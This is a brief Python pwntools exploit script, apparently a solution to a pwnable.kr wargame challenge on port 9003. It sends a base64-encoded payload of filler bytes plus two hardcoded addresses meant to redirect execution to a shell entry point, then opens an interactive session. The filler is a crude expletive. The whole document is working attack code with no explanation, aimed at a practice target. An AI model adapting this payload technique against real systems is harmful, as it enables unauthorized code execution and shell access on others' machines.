#!/usr/bin/python3
from pwn import *

shell_entry = 0x08049284
input_addr = 0x0811EB40

p = remote('pwnable.kr', 9003)
print(p.recv().decode('ascii'))

exploit_data = b'fuck' + pack(shell_entry, 32) + pack(input_addr, 32)
p.sendline(base64.b64encode(exploit_data))

p.interactive()